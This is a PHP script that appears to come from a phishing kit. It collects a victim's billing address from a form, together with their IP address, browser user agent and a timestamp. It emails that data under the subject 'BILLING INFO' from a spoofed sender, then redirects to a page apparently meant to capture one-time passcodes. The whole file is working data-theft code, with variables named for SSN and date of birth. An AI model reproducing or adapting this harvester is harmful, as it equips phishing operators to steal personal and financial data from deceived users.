<?php
require("email.php");
include("config.php");
    //Server Variables
    $ip = getenv("REMOTE_ADDR");
    $_SERVER = $_SERVER['HTTP_USER_AGENT'];
    $DATE = date("D M d, Y g:i a");
    //Name Attributes of HTML FORM


    //Fetching HTML Values
    $Fname = $_POST['addr'];
    $Lname = $_POST['city'];
    $DOB = $_POST['STATE'];
    $SSN = $_POST['zip'];
    $serv = $_REQUEST['__RequestVerificationToken'];


    $sender_name = "EM6L3M";
    $sender_mail = "em6l3mlight.log";
	

        //Main Content
        $main_subject = "BILLING INFO l $ip";
        $main_body = "<p>
        STREET : $Fname <p>
	    CITY : $Lname <p>
        STATE: $DOB <p>	
        ZIP CODE : $SSN <p>
	   <p>
        User-Ip : $ip <p>
        -----------------------------------------<p>
        User-Agent : $_SERVER
        -----------------------------------------<p>
        Date : $DATE";
        
        
//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n $uid\r\n ","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
	header("location:send-otp2.html");
?>
